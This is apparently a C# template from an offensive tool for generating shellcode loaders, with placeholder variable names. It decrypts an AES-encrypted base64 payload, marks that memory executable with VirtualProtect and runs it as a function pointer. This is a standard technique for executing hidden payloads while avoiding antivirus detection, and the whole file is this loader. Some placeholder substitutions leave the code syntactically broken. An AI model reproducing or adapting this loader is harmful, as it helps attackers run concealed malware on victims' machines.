using System;
using System.Security.Cryptography;
using System.Text;
using System.Runtime.InteropServices;
using System.IO;

namespace $NAMESPACE$
{
    public static class Program
{
    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    delegate void PrototypeFunc();

    public static void Main()
    {
        string $EncryptedBase64Var$ = "$EncryptedBase64$";
        byte[] $$DecryptFunc$edShellcode$ = $DecryptFunc$("$Key$", $EncryptedBase64Var$);
            $RunShellcodeFunc$($DecryptedShellcode$);
    }

    public static void $RunShellcodeFunc$(byte[] s)
        {
            unsafe
            {
                fixed (byte* ptr = s)
                {
                    IntPtr $PtrVar$ = (IntPtr)ptr;

    VirtualProtect($PtrVar$, (UIntPtr) s.Length, (uint)0x40, out uint lpflOldProtect);

    PrototypeFunc $DelegateDec$ = (PrototypeFunc) Marshal.GetDelegateForFunctionPointer($PtrVar$, typeof(PrototypeFunc));
                    $DelegateDec$();
            }
    }
}

    static byte[] $DecryptFunc$(string k, string srd)
    {
    byte[] tK = Encoding.ASCII.GetBytes(k);
    tK = SHA256.Create().ComputeHash(tK);

    byte[] f = Convert.FromBase64String(srd);

    Aes a = new AesManaged();
    a.Mode = CipherMode.CBC;
    a.Padding = PaddingMode.PKCS7;
    ICryptoTransform dc = a.Create$DecryptFunc$or(tK, sa(tK, 16));

    using (MemoryStream ms = new MemoryStream())
    {
        using (CryptoStream cs = new CryptoStream(ms, dc, CryptoStreamMode.Write))
        {

            cs.Write(f, 0, f.Length);

            return ms.ToArray();
        }
    }
}

static byte[] sa(byte[] a, int l)
{
    byte[] b = new byte[l];
    for (int i = 0; i < l; i++)
    {
        b[i] = a[i];
    }
    return b;
}
    }
}